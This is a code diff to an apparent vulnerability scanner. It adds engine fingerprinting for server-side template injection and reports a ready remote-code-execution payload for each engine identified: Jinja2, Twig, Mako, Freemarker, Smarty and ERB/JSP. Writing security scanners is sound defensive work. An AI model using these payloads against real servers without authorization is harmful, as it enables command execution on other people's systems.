@@ -1184,11 +1184,11 @@ def _scan_reflection(ip: str, port: Port, base: str, auth) -> list[Vuln]:
     b = r[2]
     out: list[Vuln] = []
     if "recceA49" in b or "recceB49" in b or "recceC49" in b:
-        out.append(_mk(ip, port, "web-ssti", "high",
-                       "Server-Side Template Injection (7*7 evaluated to 49)", ["CWE-1336", "CWE-94"],
-                       f"GET {base}/?rc=<7*7 payload> returned the evaluated '49' next to the canary "
-                       "-> the template engine executed our input.",
-                       "Never render user input as a template; sandbox/escape it."))
+        def _probe(p):
+            rr = _fetch(ip, port, "/?rc=" + quote(p), auth=auth)
+            return rr[2] if rr else ""
+        engine, rce = _ssti_identify(_probe)
+        out.append(_ssti_finding(ip, port, f"GET {base}/?rc=", engine, rce))
     elif "recceD<i>" in b:
         out.append(_mk(ip, port, "web-reflected", "medium",
                        "Input reflected unencoded (reflected-XSS lead)", ["CWE-79"],
@@ -1507,15 +1507,51 @@ def _body(sr):
 
 # --- reflection / SSTI (canary) -------------------------------------------------
 
+# Second-stage SSTI discriminators: which engine, and its exact RCE payload. Each probe
+# uses a marker the plain literal can't reproduce (string×int repetition, etc.).
+_SSTI_ENGINES = [
+    ("recceX{{7*'7'}}recceX", "recceX7777777recceX", "Jinja2 (Python)",
+     "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
+    ("recceX{{7*'7'}}recceX", "recceX49recceX", "Twig (PHP)",
+     "{{['id']|filter('system')}}  (or registerUndefinedFilterCallback('system') → getFilter('id'))"),
+    ("recceY${7*'7'}recceY", "recceY7777777recceY", "Mako (Python)",
+     "${__import__('os').popen('id').read()}"),
+    ("recceZ${7*7}recceZ", "recceZ49recceZ", "Freemarker (Java)",
+     "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"),
+    ("recceS{7*7}recceS", "recceS49recceS", "Smarty (PHP)", "{system('id')}"),
+    ("recceW<%=7*7%>recceW", "recceW49recceW", "ERB / JSP",
+     "<%= `id` %> (ERB)  /  <%= Runtime.getRuntime().exec(\"id\") %> (JSP)"),
+]
+
+
+def _ssti_identify(probe) -> tuple[str, str]:
+    """`probe(payload) -> body`. Returns (engine, rce_payload) or ("", "")."""
+    for payload, marker, engine, rce in _SSTI_ENGINES:
+        b = probe(payload)
+        if b and marker in b:
+            return engine, rce
+    return "", ""
+
+
+def _ssti_finding(ip, port, where, engine, rce):
+    title = "Server-Side Template Injection"
+    detail = f"{where} evaluated our template payload to 49 - the engine executed our input."
+    if engine:
+        title += f" — {engine} (RCE)"
+        detail += f"\n\nEngine: {engine}. RCE payload: {rce}"
+    return _mk(ip, port, "web-ssti", "high" if not engine else "critical", title,
+               ["CWE-1336", "CWE-94"], detail,
+               "Never render user input as a template; use a sandboxed/logic-less engine "
+               "and escape all input.", confidence="confirmed")
+
+
 def _reflect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
     b = _body(send("recceA{{7*7}}recceD<i>"))
     if not b:
         return []
     if "recceA49" in b:
-        return [_mk(ip, port, "web-ssti", "high",
-                    "Server-Side Template Injection (7*7 evaluated to 49)", ["CWE-1336", "CWE-94"],
-                    f"{where} evaluated our template payload to 49.",
-                    "Never render user input as a template; sandbox/escape it.")]
+        engine, rce = _ssti_identify(lambda p: _body(send(p)) or "")
+        return [_ssti_finding(ip, port, where, engine, rce)]
     if "recceD<i>" in b:
         return [_mk(ip, port, "web-reflected", "medium",
                     f"Input reflected unencoded in {where} (reflected-XSS lead)", ["CWE-79"],
